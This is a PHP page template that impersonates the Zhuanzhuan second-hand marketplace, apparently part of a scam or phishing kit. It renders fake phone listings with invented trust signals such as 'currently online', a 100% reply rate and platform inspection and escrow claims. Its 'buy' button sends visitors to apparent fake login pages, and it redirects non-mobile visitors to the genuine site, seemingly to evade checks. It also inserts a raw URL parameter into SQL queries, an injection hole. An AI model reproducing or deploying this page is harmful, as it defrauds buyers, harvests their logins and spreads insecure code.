<!DOCTYPE html>

<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');


if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");
	
	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	
	
	if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"http://m.zhuanzhuan.com\";
</script>";
                exit;
            }
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){

    }
}
	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
	    
		_query("
			INSERT INTO useraddress (
						
								titlea,
								type,
								class,
								gid,
								aid,
								state,
								utime
								) 
						VALUES (
							
						'{$_GoodsID['title']}',
								1,
								1,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['in_admin_id']}',
								1,
								'{$_CURRENT_TIME}'
								)"
			);
		  
		  session_destroy();
	}
	

	
	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){
		
	}
	//更新点击率	
	mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{
	
}

if($_GoodsID['oldnew']==1){
$oldnew888="全新";
$oldnew666="未激活，未使用过，全部功能正常，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==2){
$oldnew888="99新";
$oldnew666="仅激活，未使用过，全部功能正常，如下为真机实拍图";
        
}
if($_GoodsID['oldnew']==3){
$oldnew888="98新";
$oldnew666="相当于新机仅使用一周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
        $oldnew555="none";
}
if($_GoodsID['oldnew']==4){
$oldnew888="95新";
$oldnew666="相当于新机仅使用二周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
    $oldnew555="none";
}
if($_GoodsID['oldnew']==5){
$oldnew888="88新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";}
if($_GoodsID['oldnew']==6){
$oldnew888="85新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";

}



if($_GoodsID['oldnewa']==1)
$oldnewa88="/detail5/dxdl.php?weixin";
if($_GoodsID['oldnewa']==2)
$oldnewa88="/detail5/wxdl.php?weixin";

if($_GoodsID['oldnewb']==1)
$oldnewb888="更换品牌电池";
if($_GoodsID['oldnewb']==2)
$oldnewb888="无更换";
if($_GoodsID['oldnewb']==3)
$oldnewb888="男";
if($_GoodsID['oldnewb']==4)
$oldnewb888="女";

if($_GoodsID['oldnewc']==1){
$oldnewc888="yue99();";
$oldnewc8888="block";}
if($_GoodsID['oldnewc']==2){
$oldnewc888="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'";
$oldnewc8888="none";}


if($_GoodsID['oldnewe']==1){
$oldnewe9999="none";
$oldnewe8888="";
$oldnewe7777="正通过平台保卖寄存在石家庄验机中心";
    
}
if($_GoodsID['oldnewe']==2){
$oldnewe9999="";
$oldnewe8888="none";
$oldnewe7777="支持验机";
}


if($_GoodsID['qcyanji']==1){
$qcyanji777="";
$qcyanji888="Android - 安卓系统 <i class='icon-android'></i>";}
if($_GoodsID['qcyanji']==2){
$qcyanji777="【苹果版】";
$qcyanji888="App Store - 苹果正版 <i class='icon-ios'></i>";}

?>
<!doctype html>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>【转转平台】<?php echo $_GoodsID['title']; ?></title>
    <link rel="stylesheet" type="text/css" href="css/details.css">
    <link rel="shortcut icon" type="image/ico" href="favicon.ico">
    <script src="js/jquery-1.8.3.min.js" type="text/javascript" charset="utf-8"></script>
</head>

<body>
    <div class="wap">
        <div class="head">
            <span class="head-item1"><img src="img/jiantou.png"></span>
            <div class="head-item0"></div>
            <span class="head-item2"><img src="img/share.jpg.png"></span>
            <span class="head-item2"><img src="img/shenglue.png"></span>
        </div>
        <ul class="xuanxiangka spy" data-target=".spy-content" data-offset-spy="40" style="display: none;">
            <li class="active"><a href="#baby">宝贝</a></li>
            <li><a href="#seller">卖家</a></li>
            <li><a href="#interact">互动</a></li>
        </ul>
        <div class="content spy-content">
            <div class="headline" id="baby">
                <div class="headline-item1">
                    <img src="<?php echo $_GoodsID['goods_img1'] ?>">
                    <span class="names"><?php echo $_GoodsID['user_name'];?></span>
                    <span class="times">当前在线</span>
                </div>
                <div class="headline-item2">
                    <span class="price"><span class="price-mark">¥</span><span class="price-number"><?php echo $_GoodsID['price']; ?></span><span class="post-style">包邮</span></span>
                </div>
                <div class="headline-item3">
                    <h3><?php echo $_GoodsID['title']; ?></h3>
                </div>
                <div class="headline-site">
                    <div class="left">
                        <span><?php echo $_GoodsID['qh']; ?></span>
                    </div>
                    <div class="right">
                        <span>查看宝贝位置</span>
                        <img src="img/ck.png">
                    </div>
                </div>
            </div>
            <div class="serve">
                服务
                <span class="feature">特色</span>
                <span class="Amsler"><span>·</span> 支持验机 · 邮寄</span>
                <div><img src="img/jiantou.png"></div>
            </div>
            <div class="wrap-content">
                <div class="contentHeader">
                    <span class="item-line"></span>
                    <span class="title-text">商品详情</span>
                </div>
                <div class="contentParams">
                    <div class="ParamItem">颜色：<span><?php echo $_GoodsID['att_color']; ?></span></div>
                    <div class="ParamItem">容量：<span><?php echo $_GoodsID['bx']; ?></span></div>
                    <div class="ParamItem">拆修情况：<span><?php echo $_GoodsID['dc']; ?></span></div>
                    <div class="ParamItem">运行内存：<span><?php echo $_GoodsID['cd']; ?></span></div>
                    <div class="ParamItem">详细信息：<span>有配件,有包装</span></div>
                </div>
                <div class="cause">
                    <p><?php echo $_GoodsID['goods_desc'];?></p>
                </div>
                <div class="detail">
                    <div class="img-col-12">
                        <div class="img-box"><img src="<?php echo $_GoodsID['goods_img1'] ?>"></div>
                    </div>
                    <div class="img-col-12">
                        <div class="img-box"><img src="<?php echo $_GoodsID['goods_img2'] ?>"></div>
                    </div>
                    <div class="img-col-12">
                        <div class="img-box"><img src="<?php echo $_GoodsID['goods_img3'] ?>"></div>
                    </div>
                    <div class="img-col-12">
                        <div class="img-box"><img src="<?php echo $_GoodsID['goods_img4'] ?>"></div>
                    </div>
                    <div class="img-col-12">
                        <div class="img-box"><img src="<?php echo $_GoodsID['goods_img5'] ?>"></div>
                    </div>

                </div>
                <div style="clear:both; height:1px"></div>

                <div class="demarcation"></div>
                <div class="assurance">
                    <span class="assurance-item1">支持转转验机</span>
                    <span class="assurance-item2">转转担保交易</span>
                </div>
                <div class="flow">
                    <div class="imgs">
                        <span><img src="img/assure01.jpeg"></span>
                        <span><img class="dian" src="img/dian.jpeg"></span>
                        <span><img src="img/assure02.jpeg"></span>
                        <span><img class="dian" src="img/dian.jpeg"></span>
                        <span><img src="img/assure03.jpeg"></span>
                    </div>
                    <div class="explain">
                        <span>
                            <p>卖家邮寄</p>
                            <p>至验机中心</p>
                        </span>
                        <span>
                            <p>平台验机</p>
                            <p>出具验机报告</p>
                        </span>
                        <span>
                            <p>买家确认</p>
                            <p>平台顺丰包邮</p>
                        </span>
                    </div>
                </div>
                <div class="browse">
                    <span><?php echo $_GoodsID['im'];?>人想要 | <?php echo $_GoodsID['pm'];?>次浏览</span>
                </div>
            </div>
             <div class="about-seller" id="seller">
                <div class="seller-item">
                    <span class="item-line"></span>
                    <span class="title-text">关于卖家</span>
                </div>
                <div class="seller-xinxi">
                    <span><img src="<?php echo $_GoodsID['goods_img1'] ?>" onerror="this.src='image/oz.png'"></span>
                    <div class="seller-names">
                        <div class="s-names"><?php echo $_GoodsID['user_name'];?> <img src="img/renzheng.png" width="16" style="vertical-align: sub">
                        </div>
                        <div class="s-message">
                            <span><?php echo $oldnewb888;?></span>
                            <span>当前在线</span>
                        </div>
                    </div>
                    <span><img src="img/jiantou.png"></span>
                </div>
                <div class="s-classify">
                    <div>
                        <span><?php echo $_GoodsID['cpu']; ?></span>
                        <p>在售宝贝</p>
                    </div>
                    <div>
                        <span><?php echo $_GoodsID['ly']; ?></span>
                        <p>累计交易</p>
                    </div>
                    <div>
                        <span>100%</span>
                        <p>回复率</p>
                    </div>
                </div>
            </div>
            <div class="wrap-hudong-old" id="interact">
                <div class="seller-item">
                    <span class="item-line"></span>
                    <span class="title-text">互动</span>
                </div>
                <div class="hudong-img"><img src="img/hd.png"></div>
                <style type="text/css">
                    .wrap-content .contentParams img.zxwl {
                        width: 100%;
                        height: 100%;
                    }
                </style>
            </div>
            <div class="wrap-hudong" id="interact">
                <span class="question-title">大家都想问</span>
                <div class="question">
                    <span>
                        <span>走平台，支持转转验机吗? </span>
                        <img src="img/share01.png">
                    </span>
                    <span>
                        <span>机器配件都在嘛？</span>
                        <img src="img/share01.png">
                    </span>
                    <span>
                        <span>宝贝支持异地交易嘛？</span>
                        <img src="img/share01.png">
                    </span>
                    <span>
                        <span>有发票嘛?</span>
                        <img src="img/share01.png">
                    </span>
                    <span>
                        <span>是否包邮</span>
                        <img src="img/share01.png">
                    </span>
                    <span>
                        <span>ID/密码锁是否解锁？</span>
                        <img src="img/share01.png">
                    </span>
                    <span>
                        <span>能多拍几张图或拍个视频嘛？</span>
                        <img src="img/share01.png">
                    </span>
                </div>

            </div>
            <style type="text/css">
                .wrap-content .contentParams img.zxwl {
                    width: 100%;
                    height: 100%;
                }
            </style>

        </div>
        <div class="foot">
            <div class="foot-item1">
                <div class="love"></div>
                <p>想要</p>
            </div>
            <div class="foot-item2">
                聊一聊
            </div>

            <div class="btn-buy foot-item2" data-url="<?php echo $oldnewa88;?>">
                马上买
            </div>
        </div>



        <script type="text/javascript">
            if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {

            } else {
                window.location.href = "http://zhuanzhuan.58.com/";
            }
        </script>

        <script type="text/javascript">
            $(function() {
                $(".love").click(function() {
                    $(this).hasClass('active') ? $(this).removeClass('active') : $(this).addClass('active')
                })

                $(".xuanxiangka").hide();
                $(".xuanxiangka>li").click(function() {
                    $(this).addClass("active");
                    $(this).siblings().removeClass("active");
                })

                var oTop = $(".headline").offset().top;
                var sTop = 0;
                var Html = $(".price").text();
                $('.content').scroll(function() {
                    sTop = $(this).scrollTop();
                    if (sTop >= oTop) {
                        $(".head-item0").html('<span class="price-mark">¥</span><span class="price-number">' + $('.price .price-number').text() + '</span>');
                        $(".xuanxiangka").show();
                    } else {
                        $(".head-item0").empty()
                        $(".xuanxiangka").hide();
                    };
                })

                $('.btn-buy').click(function() {
                    location.href = $(this).attr('data-url');
                })

                var pic_w = $('.small_pic').width();
                $('.small_pic').height(pic_w);
                $(window).resize(function() {
                    var pic_w = $('.small_pic').width();
                    $('.small_pic').height(pic_w);
                });
            })
        </script>
    </div>
</body>

</html>